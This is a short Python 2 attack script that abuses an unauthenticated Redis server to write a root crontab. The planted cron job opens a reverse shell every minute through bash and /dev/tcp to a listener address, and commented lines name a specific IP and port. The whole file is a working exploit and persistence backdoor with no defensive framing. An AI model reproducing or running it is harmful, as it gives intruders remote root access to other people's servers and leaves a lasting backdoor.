import redis
import sys
import socket

def make_crontab(host, port):
    global make_cron_success
    global rebound_shell_ip # rebound shell ip
    global rebound_shell_port # rebound shell port
    try:
        r = redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
        mkdir_ssh_crontab = '\n\n\n' + '*/1 * * * * mkdir /root/.ssh/\n\n\n'
        mkshell_crontab = '\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1 \n\n\n' % (rebound_shell_ip,rebound_shell_port)
        ssh_shell_crontab = '\n\n\n*/1 * * * * mkdir /root/.ssh/;bash -i >& /dev/tcp/%s/%s 0>&1 \n\n\n' % (rebound_shell_ip, rebound_shell_port)
        
        if rebound_shell_ip is not None:
            crontab_backdoor = ssh_shell_crontab 
        else:
            crontab_backdoor = mkdir_ssh_crontab

        r.set('redis_crontab',crontab_backdoor)
        r.config_set('dir','/var/spool/cron/')
        r.config_set('dbfilename','root')
        r.save()
        make_cron_success = True
    except Exception, e:
        print 'Error: ',e
    return make_cron_success

print 'Usage: python %s ip port' % sys.argv[0]
make_cron_success = False

# rebound_shell_ip = '0.0.0.0'
# rebound_shell_port = '23334'

if make_crontab(sys.argv[1],sys.argv[2]) == True:
    print 'Success: ok'

#115.29.36.83
#23335